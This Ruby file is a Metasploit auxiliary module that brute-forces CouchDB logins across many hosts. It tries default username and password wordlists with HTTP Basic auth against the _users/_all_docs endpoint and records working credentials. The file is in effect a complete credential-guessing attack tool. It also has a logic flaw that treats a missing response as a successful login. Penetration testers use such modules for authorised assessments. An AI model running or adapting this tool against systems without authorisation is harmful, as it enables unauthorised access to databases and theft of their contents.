##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'CouchDB Login Utility',
      'Description'    => %{
        This module tests CouchDB logins on a range of
        machines and report successful logins.
      },
      'Author'         =>
        [
          'espreto <robertoespreto[at]gmail.com>'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(5984),
        OptString.new('TARGETURI', [false, "TARGETURI for CouchDB. Default here is /", "/"]),
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ]),
        OptBool.new('USER_AS_PASS', [ false, "Try the username as the password for all users", false]),
      ], self.class)
  end

  def run_host(ip)

    user = datastore['USERNAME'].to_s
    pass = datastore['PASSWORD'].to_s

    if user.nil? || user.strip == ''
      each_user_pass do |user, pass|
        do_login(user, pass)
      end
      return
    end

    vprint_status("#{rhost}:#{rport} - Trying to login with '#{user}' : '#{pass}'")

      uri = target_uri.path

      res = send_request_cgi({
        'uri'    => normalize_uri(uri, '_users/_all_docs'),
        'method' => 'GET',
        'authorization' => basic_auth(user, pass)
      })

      return if res.nil?
      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /CouchDB/)
      return if (res.code == 404)

      if [200, 301, 302].include?(res.code)
        vprint_good("#{rhost}:#{rport} - Successful login with '#{user}' : '#{pass}'")
      end

    rescue ::Rex::ConnectionError
      vprint_error("'#{rhost}':'#{rport}' - Failed to connect to the web server")
  end

  def do_login(user, pass)
    vprint_status("Trying username:'#{user}' with password:'#{pass}'")
    begin

      uri = target_uri.path
      res = send_request_cgi(
      {
        'uri'       => normalize_uri(uri, '_users/_all_docs'),
        'method'    => 'GET',
        'ctype'     => 'text/plain',
        'authorization' => basic_auth(user, pass)
      })

      if res and res.code != 200
        return :skip_pass
      else
        vprint_good("#{rhost}:#{rport} - Successful login with. '#{user}' : '#{pass}'")

        report_hash = {
          :host   => datastore['RHOST'],
          :port   => datastore['RPORT'],
          :sname  => 'couchdb',
          :user   => user,
          :pass   => pass,
          :active => true,
          :type => 'password'}

        report_auth_info(report_hash)
        return :next_user
      end

    rescue ::Rex::ConnectionError, ::Errno::ECONNREFUSED, ::Errno::ETIMEDOUT
      print_error("HTTP Connection Failed, Aborting")
        return :abort
    end
    rescue ::Exception => e
      print_error("Error: #{e.to_s}")
      return nil
  end
end
